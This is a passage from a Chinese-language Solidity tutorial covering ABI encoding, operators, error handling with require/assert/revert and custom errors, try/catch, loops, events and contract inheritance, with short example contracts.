    0x4141000000000000000000000000000000000000000000000000000000000000007b4242
2.AAA,BB
    0x414141000000000000000000000000000000000000000000000000000000000000007b4242
3.AA,ABB
    0x4141000000000000000000000000000000000000000000000000000000000000007b414242
[AAA,BB] 和 [AA,ABB] 因为间隔了数据，所以得到的结果不相同
*/
```







#### abi.encodeWithSeletor

这是获取函数签名使用的，第一个参数为函数选择，如下是第二章在介绍地址类型的时候，staticcall 静态调用 用法的参数，需要由 `abi.encodeWithSelector` 计算出来。函数的参数按照顺序写在函数名之后即可。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// 被调用的合约
contract Hello {
    
    function echo() external pure returns (string memory) {
        return "Hello World!";
    }
}

// 调用者合约
contract SoldityTest {
   
   function callHello(address _ads) external view returns (string memory) {
       
       // 编码被调用者的方法签名
        bytes4 methodId = bytes4(keccak256("echo()"));

        // 调用合约
        (bool success, bytes memory data) = _ads.staticcall(abi.encodeWithSelector(methodId));
        
        if (success) {
            return abi.decode(data, (string));
        } else {
            return "error";
        }
    }
}
```





```solidity
abi.encodeWithSelector(bytes4(keccak256("setNameAndAge(string,uint256)")),_name,_age)
等价于
abi.encodeWithSignature("setNameAndAge(string,uint256)",_name,_age);
```







#### abi.encodeWithSignature

这是获取函数签名使用的，第一个参数为函数的名字和参数类型，如下是第二章在介绍 [地址类型的时候，call 用法的参数](https://www.axihe.com/source/02.type-of-data.html#call)，需要由 `abi.encodeWithSignature` 计算出来。函数的参数按照顺序写在函数名之后即可。

```solidity
function call_Test1_setNameAndAge(address _ads,string memory _name,uint256 _age) external payable {
    
    bytes memory data = abi.encodeWithSignature("setNameAndAge(string,uint256)",_name,_age);
    
    (bool success, bytes memory _bys) = _ads.call{value: msg.value}(data);
    
    require(success, "Call Failed");
    
    bys = _bys;
}
```







### 补充：函数赋值给变量、函数作为参数、函数中返回函数

可以将一个函数赋值给另一个函数类型的变量，也可以将一个函数作为参数进行传递，还能在函数调用中返回函数类型变量。

- 可以将一个函数赋值给一个变量，一个函数类型的变量。
- 还可以将一个函数作为参数进行传递。
- 也可以在函数调用中返回一个函数。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FnTest1 {
    
    function internalFunc() internal pure returns (uint256) {
        return 1;
    }

    function externalFunc() external pure returns (uint256) {
        return 2;
    }

    function callFunc() public view returns (uint256, uint256) {
       
       //直接使用内部的方式调用
        uint256 a = internalFunc();  //将返回值赋值给a

        //不能在内部调用一个外部函数，会报编译错误。
        // externalFunc();
        //使用`this`以`external`的方式调用一个外部函数
        uint256 b = this.externalFunc();

        //不能通过`external`的方式调用一个`internal`
        //this.internalFunc();

        return (a, b);
    }
}

contract FnTest2 {


	//将一个合约类型作为参数传进来

    function externalCall(FnTest1 ft) public pure returns (uint256) {
        //调用另一个合约的外部函数
        uint256 a = ft.externalFunc();

        //不能调用另一个合约的内部函数
        //ft.internalFunc();

        return a;
    }
}
```





#### 具名调用和匿名函数参数

函数调用参数也可以按照任意顺序由名称给出，如果它们被包含在 `{ }` 中， 如以下示例中所示。参数列表必须按名称与函数声明中的参数列表相符，但可以按任意顺序排列。

```solidity
pragma solidity >=0.4.0 <0.9.0;

contract C {
    mapping(uint => uint) data;

    function f() public {
        set({value: 2, key: 3});  //通过键值对的形式  进行传递参数，这种写法不推荐
    }

    function set(uint key, uint value) public {
        data[key] = value;
    }

}
```



#### 省略函数参数名称

未使用参数的名称（特别是返回参数）可以省略。这些参数仍然存在于堆栈中，但它们无法访问。

```solidity
pragma solidity >=0.4.22 <0.9.0;

contract C {
    // 省略参数名称
    function func(uint k, uint) public pure returns(uint) {
        return k;
    }
}
```



#### 调用异常

如果当函数类型的**变量**还没有初始化时就调用它的话会引发一个 `Panic` 异常。 如果在一个函数被 `delete` 之后调用它也会发生相同的情况。











## 运算操作符



### 算术运算符

```solidity
+  -  *  /  %
++ 递增  -- 递减
+=  -=  *=  /=  %=
** 幂次方

&=  ^=  <<=  >>=
```



**unchecked：**默认情况下，算术运算符都会进行溢出检查，使用`unchecked`可以禁用检查，此时回返回截断结果。注意：一般不使用`unchecked`

```solidity
function f(uint a,uint b)pure public returns(uint){
	//禁用溢出检查
	//此时，减法溢出会返回“截断”结果
	unchecked{
		return a-b;
	}
}
```

溢出的检查是在`0.8.0`版本加入的，在此版本之前，请使用 **OpenZepplin SafeMath** 库。





```solidity
++i  先加后用
i++  先用后加
--i  先减后用
i--  先用后减
```

**注意：在for循环中，`++i`更节约gas**





### 关系运算符

```solidity
>  <  >=  <=  ==  !=

! 逻辑非  && 逻辑与  || 逻辑或 
注意：&& || 为短路运算符
```



==**地址类型支持的运算符：**`<=   <   ==   !=   >=   >`==



**定长字节数组支持的运算符：**

```solidity
<=  <  ==  !=  >=  >

& 按位与  | 按位或  ^ 按位异或  ~ 按位取反

<< 左移位  >> 右移位

支持索引
```





### 逻辑运算符

```solidity
&& 逻辑与
|| 逻辑或
！ 逻辑非
```



**短路用法：**

```solidity
A && B  //如果A为false，B就不执行了
A||B   //如果A为true，B就不执行了
```

**注意：合理使用短路操作，可以节省gas。**





### 三元运算符

```solidity
<expression> ? <ture Expression> : <false Expression>

例如：255 + (true ? 1:0)
```





### 位运算符

```solidity
&  按位与
|  按位或
^  按位异或
~  按位非
<< 左移位，二进制数左移，新位补0，每移动一位相当于：原始值×2
>> 右移位，二进制数右移，如果是正数则新位补0，如果是负数则新位补1，每移动一位相当于：原始值÷2
```







### delete

**delete 适用于整型，数组，结构体，映射。**

- 对于整型变量：相当于 `a = 0`。
- 对于动态数组：是将重置为数组长度为 0 的数组
- 对于静态数组：是将数组中的所有元素重置为初始值。
- 对于数组而言：`delete a[x]` 仅删除数组索引 `x` 处的元素，其他的元素和长度不变，这为数组留出了一个空位。如果打算删除项，映射可能是更好的选择。
- 对于结构体：则将结构体中的所有属性(成员)重置。
- mapping : 是将所选择的 key 重置为初始值。









### 操作符的优先级

| 优先级       | 描述             | 操作符                                                       |
| ------------ | ---------------- | ------------------------------------------------------------ |
| *1*          | 后置自增和自减   | `++`, `--`                                                   |
| 创建类型实例 | new <typename>   | `new <typename>`                                             |
|              | 数组元素         | `<array>[<index>]`                                           |
|              | 访问成员         | `<object>.<member>`                                          |
|              | 函数调用         | `<func>(<args...>)`                                          |
|              | 小括号           | `(<statement>)`                                              |
|              |                  |                                                              |
| *2*          | 前置自增和自减   | `++`, `--`                                                   |
|              | 一元运算的加和减 | `+`, `-`                                                     |
|              | 一元操作符       | `delete`                                                     |
|              | 逻辑非           | `!`                                                          |
|              | 按位非           | `~`                                                          |
|              |                  |                                                              |
| *3*          | 乘方             | `***`                                                        |
| *4*          | 乘、除和模运算   | ``, `/`, `%`                                                 |
| *5*          | 算术加和减       | `+`, `-`                                                     |
| *6*          | 移位操作符       | `<<`, `>>`                                                   |
| *7*          | 按位与           | `&`                                                          |
| *8*          | 按位异或         | `^`                                                          |
| *9*          | 按位或           | `|`                                                          |
| *10*         | 非等操作符       | `<`, `>`, `<=`, `>=`                                         |
| *11*         | 等于操作符       | `==`, `!=`                                                   |
| *12*         | 逻辑与           | `&&`                                                         |
| *13*         | 逻辑或           | `||`                                                         |
| *14*         | 三元操作符       | `<conditional> ? <if-true> : <if-false>`                     |
| *15*         | 赋值操作符       | `=`, `|=`, `^=`, `&=`, `<<=`, `>>=`, `+=`, `-=`, `*=`, `/=`, `%=` |
| *16*         | 逗号             | `,`                                                          |





### 不同数据类型的总结

 **整型 支持的运算符：**

- 比较运算符: `<=` , `<` , `==` , `!=` , `>=` , `>` 比较结果的返回值为 bool 类型
- 位运算符：`&` ，`|`，`^`（异或），`~`（非,位取反）
- 移位运算符: `<<`（左移） ， `>>`(右移)
- 数学运算：
  - `+`，`-`， 一元运算负 `-` （仅针对有符号整型）,`*`，`/`，`%`(取余)，
  - `++`,`--`,`+=`,`-=`
  - `**`（次方）





 **定长浮点型 支持的运算符：**

比较运算符：`<=`， `<`， `==`， `!=`， `>=`， `>` （返回值是布尔型）
算术运算符：`+`， `-`， 一元运算 `-`， 一元运算 `+`， `*`， `/`， `%` （取余数）

- 比较：`==  !=  >  >=  <  <=`，返回值为布尔类型
- 位运算符：`&`，`|`，`^`(异或)，`~`非





## 错误处理

### require

require用来检查某些条件，如果不满足条件，就会退回所有状态的变化。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint256 public amount = 0;

    function test(uint256 _x) external {
    
        require(_x < 10, "My error info 1"); // _x >= 10 时候会报错，报错返回 My error info 1
    
    	amount = _x;
        
        require(_x > 20); // _x <= 10 时候会报错
    }
}
```

**require函数通常用于检查输入变量或状态变量是否满足条件，以及验证调用外部合约的返回值**





### assert

如果不满足条件，则会导致panic错误。

`assert()`与 `require()` 语句都需要满足括号中的条件，才能进行后续操作，若不满足则抛出错误。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    uint256 public amount = 0;

    function test1(uint256 _x) external {
        require(_x < 10, "My error info 1"); // _x >= 10 时候会报错
        amount = _x;
        
        
        assert(amount == _x); // 必须等于_x，否则抛出错误
    }

    function test2(uint256 _x) external {
        require(_x < 10, "My error info 1"); // _x >= 10 时候会报错
        amount = _x;
        
        
        assert(amount == 8); // 必须等于8，否则抛出错误
    }

```

**`assert`和`require`的区别：`assert`不能返回报错信息，而`require`则能够返回报错信息**

一般来说，使用 `assert()`的频率较少，通常用于函数的结尾。基本上，`require()` 应该用于检查条件，而 `assert()` 只是为了防止发生任何非常糟糕的事情。





### revert

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ErrorDemo {
    function testRevert(uint256 _x) external pure {
        
        //使用revert，返回错误
        if (_x > 10) {
            revert("_x > 10");  // "_x > 10"为报错信息
        }
    }

    // 自定义错误，跟事件定义方式类似
    error MyError(address call, uint256 _i);  

    function testCustomError(uint256 _x) external view {
        
        //使用 revert 触发自定义错误
        if (_x > 10) {
            revert MyError(msg.sender, _x);  //和抛出事件方式一样
        }
    }
}
```

只要参数没有额外的附加效果，使用 `if (!condition) revert(...);` 和 `require(condition, ...);` 是等价的，例如当参数是字符串的情况。

==注意：revert本身不能包含表达式，因此只能采用`if (!condition) revert(...);` 这种形式。==





### require、assert、revert 三种方式总结

**三者不同点：**

+ `require(false)` 编译为 `0xfd`，这是 `revert()` 的操作码，**所以会==退还所有剩余的 gas==，同时可以返回一个自定义的报错信息**。
+ `assert(false)` 编译为 `0xfe`，这是一个无效的操作码，**所以==会消耗掉所有剩余的 gas==，并恢复所有的操作**。

- `require` 的 gas 消耗要小于 `assert`，而且可以有返回值，使用更为灵活。



**三者相同点：**

以下三种语句的功能完全相同：

```solidity
// revert
if(msg.sender != owner) {
   revert();
 }
// require
require(msg.sender == owner);

// assert
assert(msg.sender == owner);
```





### 自定义Error

solidity中的错误（`error`）提供了一种方便且省gas的方式来向用户解释一个操作为什么会失败。==自定义错误可以被定义在合约（包括接口和库）内部和外部。==

+ ==`error` 错误只能通过`revert`触发==
+ 使用自定义`error`抛出错误，向调用者描述错误信息
+ `error`花费gas更少
+ ==`error`可以定义在`contract`之外。==

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// 自定义错误
error MyError1(address call, uint256 _i);

contract ErrorDemo {
    // 自定义错误
    error MyError2(address call, uint256 _i);

    function testCustom1(uint256 _x) external view {
        if (_x > 10) {
        
        	//MyError1
            revert MyError1(msg.sender, _x);
        }
    }

    function testCustom2(uint256 _x) external view {
        if (_x > 10) {
        
        	//MyError2
            revert MyError2(msg.sender, _x);
        }
    }
}
```

**错误必须与 revert 语句 一起使用。它会还原当前调用中的发生的所有变化，并将错误数据传回给调用者。**









### Natspec Error

使用一个自定义的错误实例通常会比字符串描述便宜得多。因为你可以使用错误名来描述它，它只被编码为四个字节。更长的描述可以通过 NatSpec 提供，这不会产生任何费用。

通过三个斜杠 `///` 定义的错误，它比`require`更省 gas。推荐代替 require 使用。

如果错误没有任何参数，错误只需要四个字节的数据，你可以使用 NatSpec，来进一步解释错误背后的原因，NatSpec 不会存储在链上。这个方式使得它同时也是一个非常便宜和方便的错误报告功能。

更具体地说，一个错误实例的 ABI 编码方式与调用相同名称和类型的函数的方式相同，它作为`revert` 操作码的返回数据使用。 这意味着错误数据由一个 4 字节的选择器和 ABI-encoded 数据组成。选择器是错误的签名的 keccak256 哈希的前四个字节组成。



代码结构如下

```solidity
/// this is netspec error info
error MyError1();
```



示例：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ErrorDemo {
    // netspec error
    /// this is netspec error info,this is netspec error info,this is netspec error info,this is netspec error info,this is netspec error info
    error MyError1();

    /// 这是一个错误！老铁，你的输入参数错啦，必须要大于10的数字才可以通过！
    error MyError2();

    // 21647 gas
    function test1(uint256 _x) external pure {
        if (_x < 10) {
            revert MyError1();
        }
    }

    // 21691 gas
    function test2(uint256 _x) external pure {
        if (_x < 10) {
            revert MyError2();
        }
    }

    // 22036 gas
    function test3(uint256 _x) external pure {
        require(
            _x > 10,
            "this is netspec error info,this is netspec error info,this is netspec error info,this is netspec error info,this is netspec error info"
        );
    }

    // 21974 gas
    function test4(uint256 _x) external pure {
        require(
            _x > 10,
            unicode"这是一个错误！老铁，你的输入参数错啦，必须要大于10的数字才可以通过！"
        );
    }
}
```





### try catch

应用场景：**在当前合约发起外部调用，如果外部调用执行失败被revert，外部合约状态被回滚，当前合约状态也会被回滚。此时，如果在当前合约中能够捕获外部合约调用异常，然后根据实际情况处理会更好。**



==**`try ... catch`仅用于外部函数调用和合约创建调用**==

+ 外部函数调用
+ 合约创建调用



**语法：**

```solidity
try this.count() {
    // 成功逻辑
    return "success";
} catch (bytes memory) {
    // 失败逻辑: require / revert / assert
     return "assert error";
}
```





**示例：**

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract Manager{
    
    
     function count1() public pure returns (int256) {
         require(1 == 2, "require error");
         return 2;
     }
    
    function count2()public pure returns(int256){
    	assert(1==2);
    	return 2;
    }
    
    function test()public view returns(string memory){
    	//this代表当前函数
    	try this.count2(){
    		return "success"
    	}catch Error(string memory reason){
    		//reason 表示错误原因
    		//调用count()失败时执行，通过是不满足require条件或触发revert语句所引起的调用失败
    		return "assert error"
    	}
    }
    
}
```

也可以去掉`catch Error(string memory reason)`，只使用 `catch (bytes memory)`；

如下的测试

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Manager {
    function count() public pure returns (int256) {
        require(1 == 2, "require error");
        return 2;
    }

    function test() public view returns (string memory) {
        // this 代表当前合约
        try this.count() {
            return "success";
        } catch (bytes memory) {
            // 调用 count() 异常时执行，通常是触发 assert 语句或除 0 等比较严重错误时会执行
            return "assert error";
        }
    }
}
```











## 流程控制

**语法：**

```solidity
if (条件表达式 1) {

   被执行语句(如果条件 1 为真)
   
} else if (条件表达式 2) {

   被执行语句(如果条件 2 为真)
   
} else if (条件表达式 3) {

   被执行语句(如果条件 3 为真)
   
} else {

   被执行语句(如果所有条件为假)
   
}
```



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    function example(uint256 _x) external pure returns (uint256) {
        if (_x < 10) {
            return 1;
        } else if (_x < 20) {
            return 2;
        } else {
            return 3;
        }
    }
}
```





**三元运算符：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract IfElse{
    function example2 (uint _x) external pure returns (uint){
    	
    	//三元运算符： ? :
        return _x<10 ? 1 : 2;
    }
}
```



==**注意：soldiity中的switch用法只存在内联汇编中**==





## 循环与迭代



### for

**语法：**

```solidity
for (初始化; 测试条件; 迭代语句) {
   // 如果表达式的结果为真，就循环执行以下语句
   ......
}
```



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract For {
    // 输入5    输出15
    function test1(uint256 _x) external pure returns (uint256 temp) {
        for (uint256 i = 1; i <= _x; i++) {
            temp += i;
        }
    }
}
```





**循环控制：**

+ break，终止循环
+ continue，跳出当前循环，进入下一次循环



==**注意：在循环中 ，尽量使用`++i`，该用法更省gas。**==





### while



**语法：**

```solidity
while (表达式) {
   // 如果表达式的结果为真，就循环执行以下语句
   ......
}
```



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract For {
    function test1(uint256 _x) external pure returns (uint256 temp) {
        uint256 i = 0;
        while (i <= _x) {
            temp += i;
            i++;
        }
    }
}
```





### do...while

**语法：**

```solidity
do {
   // 如果表达式的结果为真，就循环执行以下语句
   ......
} while (表达式);
```

**注意：do...while循环，无论表达式是否为true，都会执行一次，下次循环会进行表示式判断，只有为true才进行下一次循环。**



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract For {
    function test1(uint256 _x) external pure returns (uint256 temp) {
        uint256 i = 0;
        while (i <= _x) {
            temp += i;
            i++;
        }
    }

    function test2(uint256 _x) external pure returns (uint256 temp) {
        uint256 i = 0;
        do {
            temp += i;
            i++;
        } while (i <= _x);
    }
}
```













## 事件

事件是能方便调用以太坊虚拟机日志功能的接口。应用程序可以通过以太坊客户端的RPC接口订阅和监听这些事件。

**重点:记录区块链的日志，可以使用状态变量，也可以使用事件 Event，但 Event 使用的 gas 费比状态变量低。**

==原则：改变状态变量时，一定要触发事件。==





### Event语法：

事件定义：使用event关键字来定义一个事件

```solidity
event EventName(<parameter list>);
```

事件触发：只能使用emit关键字来触发事件Event

```solidity
emit EventName(<parameter list>);
```







### 四种事件定义方式

1. 不带参数的 event
2. 带参数的 event
3. 带参数名的 event
4. 带 indexed 参数名的 event
   1. 这种事件也被称为**索引事件**
   2. 语法:`event EventName(TypeName indexed varibleName....);`
   3. ==事件中 indexed 标记过的参数，可以在链外进行搜索查询。==
   4. ==一个事件中 indexed 标记过的参数**最多有 3 个**。==



```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.17;

contract Event{
	//定义事件
	//普通event,不带参数名
	event Log1(address,string)
	
	//待参数名的event
	event Log2(address ads,string msg);
	
	//带indexed的event
	event Log3(address indexed ads,string msg);
	
	//indexed在一个事件内使用次数不能超过三个
	event Transfer(address indexed from,address indexed to,uint256 indexed amount);
	
	
	//触发事件
	function log1()external{
		emit Log1(msg.sender,"Log111");
	}
	
	function log2()external{
		emit Log2(msg.sender,"Log222");
	}
	
	function log3()external{
		emit Log3(msg.sender,"Log333");
	}
	
	function transfer(address _to,uint256 amount)external{
		emit Transfer(msg.sender,_to,amount);
	}
}
```



**不带参数的event：**

```json
[
	{
		"from": "0x7874d94b8f9E2a28FCceCE404666C984f33a82b8",
		"topic": "0x1732d0c17008d342618e7f03069177d8d39391d79811bb4e706d7c6c84108c0f",
		"event": "Log1",
		"args": {}
	}
]
```



**带参数的event：**

```json
[
	{
		"from": "0x7874d94b8f9E2a28FCceCE404666C984f33a82b8",
		"topic": "0x54010eb0426bdddd13273086604fca7ba750a84093c6839732d954056646e81b",
		"event": "Log2",
		"args": {
			"0": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"1": "Log222"
		}
	}
]
```



**带参数名的event：**

```json
[
	{
		"from": "0x7874d94b8f9E2a28FCceCE404666C984f33a82b8",
		"topic": "0x940879bf2d29cdfe8084f2f033d2168f5859a6e10530b61fb84dc1c5ddc9ca40",
		"event": "Log3",
		"args": {
			"0": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"1": "Log333",
			"ads": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"msg": "Log333"
		}
	}
]
```



**带indexed参数名的event：**

```json
[
	{
		"from": "0xfB72aAdB17a855D27A68B565ee0a84CB30A387e4",
		"topic": "0xf485c071883274befba21423da7f60203f9df753bf614bca26c4763ed4b240fb",
		"event": "Log4",
		"args": {
			"0": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"1": "Log444",
			"ads": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"msg": "Log444"
		}
	}
]
```



```json
[
	{
		"from": "0xfB72aAdB17a855D27A68B565ee0a84CB30A387e4",
		"topic": "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
		"event": "Transfer",
		"args": {
			"0": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"1": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"2": "1",
			"from": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"to": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4",
			"amount": "1"
		}
	}
]
```





### indexed的作用

**indexed数据会记录到`topics`中，可以用于检索**。已索引的部分，==最多有3个（对非匿名事件）或4个（对于匿名事件）==。

对于非匿名事件，最多三个参数可以接收 `indexed`属性（它是一个特殊的名为: “主题” 的数据结构，而不作为日志的数据部分）。主题仅有 32 字节， 因此如果:引用类型 标记为索引项，则它们的 keccak-256 哈希值会被作为 主题（topic） 保存。

主题（topic）让我们可以可以搜索事件，比如在为某些事件过滤一些区块，还可以按发起事件的合同地址来过滤事件。



```js
var options = { 
    fromBlock: 0, 
    address: web3.eth.defaultAccount, 
    topics: ["0x0000000000000000000000000000000000000000000000000000000000000000", null, null], 
	};
	web3.eth.subscribe("logs", options, function (error, result) { 
        if (!error) console.log(result); })
        .on("data", function (log) { 	console.log(log); })
        .on("changed", function (log) {}); 
```

主要用在链下服务，可以通过 RPC 获取，比如 web3 的以下方法:

- `myContract.once`
  - https://web3js.readthedocs.io/en/v1.7.5/web3-eth-contract.html
- `myContract.events.MyEvent`
  - https://web3js.readthedocs.io/en/v1.7.5/web3-eth-contract.html#contract-events
- `myContract.getPastEvents`
  - https://web3js.readthedocs.io/en/v1.7.5/web3-eth-contract.html#getpastevents





### Log的使用

除非你用 `anonymous` 声明事件，否则事件签名的哈希值是一个 主题（topic）。同时也意味着对于匿名事件无法通过名字来过滤，仅能按合约地址过滤。匿名事件的优势是他们部署和调用的成本更低。它也允许你声明 4 个索引参与而不是 3 个。

⚠️：由于交易日志只存储事件数据而不存储类型。你必须知道事件的类型，包括哪个参数被索引，以及该事件是否是匿名的，以便正确解释数据。尤其是，有可能使用一个匿名事件来"伪造"另一个事件的签名。

```solidity
pragma solidity  >=0.4.21 <0.9.0;

contract ClientReceipt {
    event Deposit(
        address indexed from,
        bytes32 indexed id,
        uint value
    );

    function deposit(bytes32 id) public payable {
        // 事件使用 emit 触发事件。
        // 我们可以过滤对 `Deposit` 的调用，从而用 Javascript API 来查明对这个函数的任何调用（甚至是深度嵌套调用）。
        emit Deposit(msg.sender, id, msg.value);
    }
}
```

使用 JavaScript API 调用事件的用法如下：

```js
var abi = /* abi 由编译器产生 */;
var ClientReceipt = web3.eth.contract(abi);
var clientReceipt = ClientReceipt.at("0x1234...xlb67" /* 地址 */);

var depositEvent = clientReceipt.Deposit();

// 监听变化
depositEvent.watch(function(error, result) {
    // 结果包含 非索引参数 以及 主题 topic
    if (!error)
        console.log(result);
});

// 或者通过传入回调函数，立即开始听监
var depositEvent = clientReceipt.Deposit(function(error, result) {
    if (!error)
        console.log(result);
});
```

上面的输出如下所示（有删减）：

```js
{
	"returnValues": {
		"from": "0x1111…FFFFCCCC",
		"id": "0x50…sd5adb20",
		"value": "0x420042"
	},
	"raw": {
		"data": "0x7f…91385",
		"topics": ["0xfd4…b4ead7", "0x7f…1a91385"]
	}
}
```





### Log重载

**==Log 可以像函数一样重载==**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Event {
    event Log(address ads);
    event Log(address indexed ads, string msg); // 重载

    function log1() external {
        emit Log(msg.sender);
    }

    function log2() external {
        emit Log(msg.sender, "Log111");
    }
}
```







## 合约继承

solidity实现继承的方式是通过复制包括多态的代码到子类来实现的。

+ 修饰符可以继承
+ **事件不可以继承，但可以重载**
+ **`fallback`可以继承，需要保持原有的`payable/nonpayable`**
+ **`receive`可以继承，需要保持原有的`payable/nonpayable`**







### 使用`is`实现继承

一个合约从多个合约继承时，在区块链上只有一个合约被创建，所有基类合约（父类合约）的代码被编译到创建的合约中。

+ 继承：派生合约继承基类合约的属性和方法
+ 基类合约通常被称为父合约，派生合约通常也称为子合约



**==注意==：**

+ ==**virtual：父合约中的函数或函数修改器，如果希望子合约重写，需要加上virtual关键字**==
+ ==**override：子合约重写了父合约中的函数或函数修改器，需要加上override关键字**==





```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Person{
	string internal name;
	uint256 age;   //状态变量默认是internal权限
	
	event Log(string funName);
	
	modifier onlyOwner()virtual{  //表明：子合约可以对该函数修改器进行重写
		age =1;
		_;
	}
	
	fallback()external payable virtual{
		emit Log("fallback by Person");
	}
	
	receive()external payable virtual{
		emit Log("receive by Person");
	}
}

contract Man is Person{
	
	constructor(){
		name = "Anbang";
		age = 18;
	}
	
	event Log(string funName,address _ads);
	
	modifier onlyOwner()override{
		age = 99;
		_;
	}
	
	function getName()external view returns(string memory){
		return name;
	}
	
	function getAge()external view returns(uint256){
		return age;
	}
	
	function getAge2()external onlyOwner returns(uint256){
		return age;
	}
	
	//fallback和receive继承时，必须保证payable/nonpayable状态不变
	
	fallback()external payable override{
		emit Log("fallback by man");
	}
	
	receive()external payable override{
		emit Log("receive by man",msg.sender);
	}
}
```

==**注意：父合约必须写在子合约的前面，否则会报错：`TypeError: Definition of base has to precede definition of derived contract`**==







### 子类可以继承父类哪些数据？

**==重点==：子类可以访问父类的权限只有：`public、internal`，但不能是`external 、private`。**

==注意：如果父类的状态变量和函数是`private`和`external`，则子类不可以继承和访问。==

**可以继承：状态变量、事件、函数、函数修改器、构造函数、自定义错误**



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Person {
    string internal name;
    uint256 age; // 状态变量默认是internal权限
    uint256 public hand = 2;
    uint256 private privateState = 99;

    function publicFn() public pure returns (uint256) {
        return 1;
    }

    function internalFn() internal pure returns (uint256) {
        return 2;
    }

    function privateFn() private pure returns (uint256) {
        return 3;
    }
}

contract Man is Person {
    constructor() {
        name = "Anbang";
        age = 18;
    }

    function getInfo()external view returns (string memory,uint256,uint256){
        
        return (name, age, hand);
        // privateState 不可以访问
    }

    function getPublicFn() external pure returns (uint256) {
        return publicFn();
    }

    function getInternalFn() external pure returns (uint256) {
        return internalFn();
    }

    // 不可以访问 privateFn 的方法
    // function getPrivateFn() external pure returns (uint256) {
    //     return privateFn(); // Undeclared identifier.
    // }
}
```







### 多重继承中的重名

**一个合约同时继承两个合约时，这叫多重继承**

==注意：多重继承中不允许出现相同的**函数名**、**事件名**、**修改器名**和**状态变量名**等。==



在多重继承中，**容易出现比较隐蔽的冲突情况：**

+ **函数名和修改器/modifier同名 会报错**
+ **函数名和事件名相同，会报错**
+ **事件名和修改器名/modifier名相同，会报错**
+ 还有一种特殊的情况，就是：状态变量会默认创建一个外部调用函数来获取该状态变量值，如果这个**默认创建的函数名和自定义函数重名也会报错**。



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract A {
    uint256 public data = 10;
}

contract B {
    // data函数之所以出错
    // 是因为和 A 中状态变量 data 的 getter 函数重名。
    function data() external returns (uint256) {
        return 1;
    }
}

contract C is A, B {}   //这里会报错
```





### 重写函数

solidity中引入了`abstract、virtual、override`几个关键字，用于重写函数。

继承中方法重写注意事项：

+ 父合约方法需要标示为**可修改**，使用关键字`virtual`
+ 子合约方法需要标示为**覆盖**，使用关键字`override`
  + **对于多重继承，如果有多个父合约有相同定义的函数， override 关键字后必须指定所有父合约名**。
+ 基类合约中可以包含没有实现的函数，即纯函数，那么基类合约必须声明为`abstract`
+ 继承多个合约时，所有同名的可修改函数都要重写
+ **继承后重写合约方法，各个合约内的函数可见性必须一致**



#### override和virtual



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract A{
	
	function test1() public virtual returns(string memory){
		return "test1 form A";
	}
}

contract B is A{
	
	function test1()public virtual override returns(string memory){
		return "test1 from B";
	}
}

contract C is B{
	
	function test1() public pure override returns(string memory){
		return "test1 from C";
	}
}
```



**多个父合约具有相同定义的函数：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Base1{
	
	function foo() virtual public {
		
	}
}

contract Base2{
	
	function foo() virtual public{
	
	}
}

contract Inherited is Base1,Base2{
	
	//继承自两个基类合约定义的foo()，必须显示的指定override
	
	//显示指定对某个合约中的某个函数进行重写
	function foo() public override(Base1,Base2){
	
	}
}
```



```solidity
contract D{
	function f1(uint256 x) external{
	
	}
	
	//方法重写
	function f1() external returns(uint256){
	
	}
	
	在非继承中，这是方法重写，不需要virtual和override
	
	但是在继承中，父类需要重写的方法必须标记为virtual，子类中需要重写的方法标记为override，而且不能更改可见性，可变性，和返回值等。必须和要重载的方法一致。
	
}
```











#### abstract（抽象合约）

基类合约中可以包含没有代码实现的函数，即纯函数，此时基类合约必须声明为`abstract`

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.17;

abstract contract IERC20{
	
	function transfer()external virtual returns(bool);
}

contract ERC20 is IERC20{
	
	function transfer() external pure override returns(bool){
		return true;
	}
}
```

==**注意：这里的`abstract`，也可以使用`interface`来解决。**==







### 多级继承的代码书写顺序（线性化）

solidity语言中的多重继承采用线性继承方式。**原则：先写基础合约，再写派生合约。**



```solidity
/**
 B   A
  \ /
   C
 */
 
 此时， 可以是 C is A , B   或  C is B ,A  ，这两种方式都可以 
```



```solidity
/**
    A
  / |
B   |
  \ |
    C
 */
 
 此时，只能为 C is A,B   而不能为 C is B,A 。因为 A更基础，B是A的派生合约
```

==**多重继承时候，需要先写基础合约，再写派生合约**==







### 继承中两种构造函数传参方式

